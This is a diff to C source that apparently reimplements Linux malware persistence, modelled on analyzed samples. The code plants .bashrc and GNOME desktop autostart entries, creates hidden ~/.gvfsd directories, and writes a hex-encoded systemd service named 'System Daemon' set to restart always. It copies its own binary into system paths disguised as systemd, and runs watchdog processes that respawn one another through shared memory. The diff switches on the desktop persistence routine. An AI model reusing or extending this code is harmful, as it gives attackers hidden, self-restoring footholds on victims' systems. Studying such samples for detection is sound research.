@@ -22,6 +22,7 @@ bool copy_rota_to_userland(char *destpath) {
     stat("/proc/self/exe", &procstru);
     fsize = procstru.st_size;
     char *exe = (char *)malloc(fsize);
+    memset(exe,0, fsize);
 
     // copy data from /proc/self/exe into exe buffer.
     int fd  = open("/proc/self/exe", O_RDONLY);
@@ -74,9 +75,8 @@ bool nonroot_bashrc_persistence() {
     }
 
     bytes_written = write(fd, bashrc_autostart, strlen(bashrc_autostart));
-
     if (bytes_written < 0) {
-        fprintf(stderr, "\nError writing to bashrc: %s", strerror(errno));
+        fprintf(stderr, "\n[nonroot_bashrc_persistence]Error writing to bashrc: %s", strerror(errno));
     }
 
     close(fd);
@@ -115,6 +115,7 @@ bool nonroot_desktop_persistence() {
     int dirpath_size = strlen(HOME) + strlen(audir);
     char *dirpath = (char *)malloc(dirpath_size);
     memset(dirpath, 0, dirpath_size);
+
     strncat(dirpath, HOME, strlen(HOME));
     strncat(dirpath, audir, strlen(audir));
     if (access(dirpath, F_OK) == -1) {
@@ -124,7 +125,7 @@ bool nonroot_desktop_persistence() {
     // TODO: decrypt and rotate char array for stack string to then execute write_to_file
     bool result = write_to_file(fpath, gnomehelper_desktop);
 
-    // -------- copy userland binry now ------------- 
+    // -------- copy userland binary now -------------
     //
     // copy rota binary
     // TODO convert gvfsd_helper into char array
@@ -142,6 +143,8 @@ bool nonroot_desktop_persistence() {
     char *gvfsd_profile= "/.gvfsd";
     dirpath_size = strlen(HOME) + strlen(gvfsd_profile);
     char *dirpath_profile = (char *)malloc(dirpath_size);
+    memset(dirpath_profile, 0, dirpath_size);
+
     strncat(dirpath_profile, HOME, strlen(HOME));
     strncat(dirpath_profile, gvfsd_profile, strlen(gvfsd_profile));
     // if directory does not exist create it.
@@ -158,13 +161,14 @@ bool nonroot_desktop_persistence() {
     char *profile_dir = "/.gvfsd/.profile";
     dirpath_size = strlen(HOME) + strlen(profile_dir);
     char *profilepath_profile = (char *)malloc(dirpath_size);
+    memset(profilepath_profile, 0, dirpath_size);
     strncat(profilepath_profile, HOME, strlen(HOME));
     strncat(profilepath_profile, profile_dir, strlen(profile_dir));
     // if directory does not exist create it.
     if (access(profilepath_profile, F_OK) == -1) {
         int res = mkdir(profilepath_profile, 0755);
         if (res != 0) {
-            fprintf(stderr, "\n[gvfsd/profile]Error creating directory to %s\tError: %s",
+            fprintf(stderr, "\n[gvfsd/profile] Error creating directory to %s\tError: %s",
                 dirpath_profile, strerror(errno));
         }
     }
@@ -186,8 +190,7 @@ bool nonroot_desktop_persistence() {
 bool nonroot_persistence(void) {
     // handy wraper funtion for non-root persistence.
     // note - this is not 1:1 with how the analyzed samples call persistence methods.
-
-    //nonroot_desktop_persistence();
+    nonroot_desktop_persistence();
     nonroot_bashrc_persistence();
     return true;
 }
@@ -221,6 +224,7 @@ bool root_persistence(void) {
 
         int fpath_size = strlen(systemd_path_1);
         fpath = (char *)malloc(fpath_size);
+        memset(fpath,0, fpath_size);
         result = write_to_file(fpath, systemd_agent_conf);
         copy_rota_to_userland("/bin/systemd/systemd-daemon");
 
@@ -243,6 +247,8 @@ bool root_persistence(void) {
         char sys_temd_agent_service [166] = {0x5b,0x55,0x6e,0x69,0x74,0x5d,0xa,0x44,0x65,0x73,0x63,0x72,0x69,0x70,0x74,0x69,0x6f,0x6e,0x3d,0x53,0x79,0x73,0x74,0x65,0x6d,0x20,0x44,0x61,0x65,0x6d,0x6f,0x6e,0xa,0x57,0x61,0x6e,0x74,0x73,0x3d,0x6e,0x65,0x74,0x77,0x6f,0x72,0x6b,0x2d,0x6f,0x6e,0x6c,0x69,0x6e,0x65,0x2e,0x74,0x61,0x72,0x67,0x65,0x74,0xa,0x41,0x66,0x74,0x65,0x72,0x3d,0x6e,0x65,0x74,0x77,0x6f,0x72,0x6b,0x2d,0x6f,0x6e,0x6c,0x69,0x6e,0x65,0x2e,0x74,0x61,0x72,0x67,0x65,0x74,0xa,0x5b,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x5d,0xa,0x45,0x78,0x65,0x63,0x53,0x74,0x61,0x72,0x74,0x3d,0x2f,0x75,0x73,0x72,0x2f,0x6c,0x69,0x62,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x64,0x2f,0x73,0x79,0x73,0x74,0x65,0x6d,0x64,0x2d,0x64,0x61,0x65,0x6d,0x6f,0x6e,0xa,0x52,0x65,0x73,0x74,0x61,0x72,0x74,0x3d,0x61,0x6c,0x77,0x61,0x79,0x73,0xa,0x5b,0x69,0x6e,0x73,0x74,0x61,0x6c,0x6c,0x5d,0xa};
         int fpath_size = strlen(init_path_1);
         fpath = (char *)malloc(fpath_size);
+        memset(fpath,0, fpath_size);
+
         result = write_to_file(fpath, sys_temd_agent_service);
         copy_rota_to_userland("/usr/lib/systemd/systemd-daemon");
     }
@@ -280,6 +286,8 @@ void fork_exec(char *fpath) {
     int res = fork();
 
     if (res < 0) {
+        fprintf(stderr, "[fork_exec] error forking : %s",
+                strerror(errno));
         exit(1);
     }
     if (res == 0){
@@ -292,11 +300,12 @@ void fork_exec(char *fpath) {
 }
 
 
-void watchdog_process_shmget(char *fpath){
+void *watchdog_process_shmget(void *fpath){
 
     bool proc_alive;
     int pid = getpid();
     char *c_pid = (char *)malloc(sizeof(int));
+    memset(c_pid, 0, sizeof(int));
     sprintf(c_pid, "%d", pid);
 
     // obtain PID from shared memory
@@ -337,7 +346,7 @@ void watchdog_process_shmget(char *fpath){
 }
 
 
-void watchdog_process_shmread(char *fpath) {
+void *watchdog_process_shmread(void *fpath) {
 
     bool proc_alive;
 
@@ -347,7 +356,6 @@ void watchdog_process_shmread(char *fpath) {
             fprintf(stderr, "\n[wathcdog_process_shmread] %s\n", strerror(errno));
             fork_exec(fpath);
         }
-
         // get pid from shared memory.
         char *shmem_pid_addr = shmat(shmid, NULL, 0);
         proc_alive = monitor_proc(shmem_pid_addr);
